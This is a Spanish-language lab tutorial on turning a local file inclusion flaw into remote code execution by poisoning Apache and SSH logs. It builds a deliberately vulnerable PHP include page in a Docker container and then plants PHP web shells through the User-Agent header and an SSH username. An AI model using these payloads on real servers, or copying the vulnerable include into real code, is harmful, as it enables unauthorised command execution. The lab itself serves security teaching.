---
title: "[Lab] Log Poisoning (LFI -> RCE)"
date: 2023-12-25
categories: [OWASPTop10]
tags: [owasptop10, hacking, apache, ssh]
---


# Log Poisoning (LFI -> RCE)
    

## Instalación

```bash
docker pull ubuntu:latest
docker run -dit -p 80:80 -p 22:22 --name rfi ubuntu
docker exec -it rfi bash
apt update
apt install apache2 ssh php nano -y
service apache2 start
service ssh start
cd /var/www/html
```

Dentro del directorio /html, crear un archivo php con el siguiente contenido:

```bash
<?php
	include($_GET['file']);
?>
```

Una vez hecho eso, se procede a probar el funcionamiento:

![Untitled](../assets/OWASP-TOP-10/Log Poisoning (LFI - RCE)/Untitled.png)

## Explotación

### Log Poisoning (Logs de Apache: /var/log/apache2/access.log)

Este archivo sirve para guardar todos los logs de peticiones que se hagan al servidor web

![Untitled](../assets/OWASP-TOP-10/Log Poisoning (LFI - RCE)/Untitled 1.png)

Si se revisan los permisos de los archivos de este directorio, se puede ver que como propietario está root y como grupo está “adm”, este último es un grupo en el cual los usuarios que estén en él, tienen acceso a ver logs del sistema.

![Untitled](../assets/OWASP-TOP-10/Log Poisoning (LFI - RCE)/Untitled 2.png)

Para ver el funcionamiento de este envenenamiento, se cambiarán los permisos de estos archivos para que el usuario www-data tenga acceso a ellos:

```bash
chown www-data:www-data -R var/log/apache2/
```

![Untitled](../assets/OWASP-TOP-10/Log Poisoning (LFI - RCE)/Untitled 3.png)

La debilidad está en el campo “User-Agent” ya que este campo se puede cambiar y si la máquina interpreta código php, es posible inyectar comandos:

```bash
curl -s -X GET "http://localhost/?file=loquesea" 
-H "User-Agent: hola"
```

![Untitled](../assets/OWASP-TOP-10/Log Poisoning (LFI - RCE)/Untitled 4.png)

No siempre la función “system()” estará habilitada, una forma de verificar esto es con la función phpinfo(), esto mostrará información de la configuración de Apache2:

```bash
curl -s -X GET "http://localhost/?file=loquesea" 
-H "User-Agent: <?php phpinfo(); ?>"
```

![Untitled](../assets/OWASP-TOP-10/Log Poisoning (LFI - RCE)/Untitled 5.png)

Es posible que los desarrolladores desactiven ciertas funcionalidades como el uso de la función system() u otras funcionalidades que permitan el uso de comandos.

Ya que no hay funcionalidades deshabilitadas, se puede aprovechar de estos para ejecutar un código php el cual permita controlar los comandos desde el URL:

[ALERTA]: Hay que tener cuidado con el comando ejecutado ya que puede contaminar los logs y dejarlos “inutilizables” haciendo que la ejecución de comandos ya no funcione, esto puede provocarlo, por ejemplo, una mal posición de las comillas.

```bash
curl -s -X GET "http://localhost/?file=loquesea" 
-H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Ejemplo de comando incorrecto que puede dejar 
# inutilizable los logs para ejecución de comandos
curl -s -X GET "http://localhost/?file=loquesea" 
-H 'User-Agent: <?php system(\$_GET["cmd"]); ?>'
```

![Untitled](../assets/OWASP-TOP-10/Log Poisoning (LFI - RCE)/Untitled 6.png)

### Log Poisoning (Logs de SSH: /var/log/btmp)

Normalmente, el archivo de logs de ssh se llama “auth.log” pero en este caso es “btmp”, ambos tienen la funcionalidad de mostrar el historial de intentos de inicio de sesión por ssh.

![Untitled](../assets/OWASP-TOP-10/Log Poisoning (LFI - RCE)/Untitled 7.png)

El campo vulnerable es el usuario con el cual se inicia sesión de forma que se podría cambiar este usuario por un código php que permita la ejecución de comandos.

```bash
ssh '<?php system($_GET["cmd"]); ?>'@<máquinaVíctima>
```

Luego, para que ver la funcionalidad del código, se proporcionará permisos de lectura a otros sobre el archivo “btmp”.

```bash
chmod o+r btmp
```

Cabe recalcar que una vez que se le asigne algún permiso al archivo “btmp”, este no almacenará más logs por lo que el log con el código debe mandarse antes de poner los permisos.

![Untitled](../assets/OWASP-TOP-10/Log Poisoning (LFI - RCE)/Untitled 8.png)

*Los inicios de sesión exitosos, son almacenados en /var/log/wtmp y estos pueden ser mostrados con el comando “last” y los inicios de sesión erroneos con “lastb”.*
